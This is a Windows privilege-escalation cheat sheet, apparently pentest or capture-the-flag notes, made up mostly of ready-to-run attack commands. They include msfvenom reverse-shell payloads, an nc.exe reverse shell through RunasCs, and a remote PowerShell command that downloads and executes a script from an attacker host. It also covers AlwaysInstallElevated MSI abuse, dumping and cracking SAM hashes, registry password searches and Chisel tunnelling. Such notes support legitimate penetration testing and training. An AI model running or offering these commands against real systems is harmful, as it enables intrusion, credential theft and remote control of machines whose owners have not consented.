Tools

```
https://github.com/AonCyberLabs/Windows-Exploit-Suggester
https://github.com/itm4n/PrivescCheck
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
https://github.com/mertdas/PrivKit
```

Forwarding service

[TCP/UDP tunnel over HTTP](https://github.com/jpillora/chisel)

PowerShell history file

```cmd
REM location
cd C:\Users\<User Account>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
REM file
type C:\Users\<User Account>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
REM dir
cd C:\Users
dir /S /B ConsoleHost_history.txt
```

[LAN Manager authentication level](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level)

- [NTLMv1 attack](https://github.com/SpiderLabs/Responder)

Check unusual programs

```
C:\Program Files
C:\Program Files (x86)
```

MSFVenom Reverse Shell Payload

```
msfvenom -p windows/shell_reverse_tcp lhost=<attacker ip> lport=<attacker listening port> -f exe > rev.exe
```

:label: Running PowerShell as another user (switch user in Windows)

Method 1: reverse shell with credential

```cmd
REM create payload
msfvenom -p windows/shell_reverse_tcp lhost=<attacker ip> lport=<attacker listening port> -f exe > rev.exe
REM change user, password and payload
powershell -c "$password = ConvertTo-SecureString '<password>' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('<user>', $password);Start-Process -FilePath "<payload>" -Credential $creds"
```

Method 2: [RunasCs](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1)

```powershell
Invoke-RunasCs <username> <password> "cmd /c C:\users\public\nc.exe -e cmd.exe <attacker ip> <attacker port>"
```

specify a computer name in the AD environment

prepare PowerShell reverse shell script file ```XXX.ps1```

execute command in the target host

```cmd
powershell -c "$pass = ConvertTo-SecureString '<password>' -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential('<domain>\<username>', $pass);Invoke-Command -Computer <name> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<attacker ip>/<XXX.ps1>') } -Credential $cred"
```

File owner access permission 

```cmd
REM check owner
dir /q /a
REM grant full access
icacls <file> /grant <user>:F
```

AlwaysInstallElevated

```shell
# AlwaysInstallElevated set to 1 in HKLM!
# AlwaysInstallElevated set to 1 in HKCU! 
# using msfvenom to create payload
msfvenom -p windows/x64/shell/reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f msi -o reverse.msi
```

execute the command on the target

```powershell
# <payload> = reverse.msi
msiexec /quiet /qn /i <payload>
```

SAM (SYSTEM account) (HTB:Omni)

```cmd
reg save HKLM\SYSTEM C:\SYSTEM
reg save HKLM\SAM C:\SAM
```

```shell
python3 secretsdump.py -system /tmp/SYSTEM -sam /tmp/SAM LOCAL
hashcat -m 1000 ./hash ~/Documents/rockyou.txt
```

[Chisel](https://github.com/jpillora/chisel) (port forwarding)

```shell
# client
chmod +x chisel
./chisel server --reverse --port <attacker port>
# Windows target
.\chisel.exe client <attacker ip>:<attacker port> R:<local-interface>:<local-port>:<remote-host>:<remote-port>/<protocol>
# attacker ip = 10.10.10.10
./chisel server --reverse --port 10000
.\chisel.exe client 10.10.10.10:10000 R:4444:localhost:3306 R:5555:localhost:3307
# attacker 
localhost 4444 => remote 3306
localhost 5555 => remote 3307
```

Windows Updates

```cmd
wmic qfe
```

```powershell
Get-HotFix
```

Installed Programs

```cmd
wmic product get name, version, installlocation
```

passwords in Registry

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

#### FullPowers

[FullPowers](https://github.com/itm4n/FullPowers)

Restoring the default privileges for a `service account`, including `SeAssignPrimaryToken` and `SeImpersonate`, allows you to utilize the `Potato` program.

#### Tools

[Chisel](https://github.com/jpillora/chisel): Pivoting<br>
[ysoserial.net](https://github.com/pwntester/ysoserial.net): Deserialization payload generator for a variety of .NET formatters

#### Exploits

- CVE-2021-1732
- MS10-059

WerTrigger

```
https://github.com/sailay1996/WerTrigger
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#wertrigger
https://notes.vulndev.io/wiki/redteam/privilege-escalation/windows/exploiting-privileged-read-write-delete
```
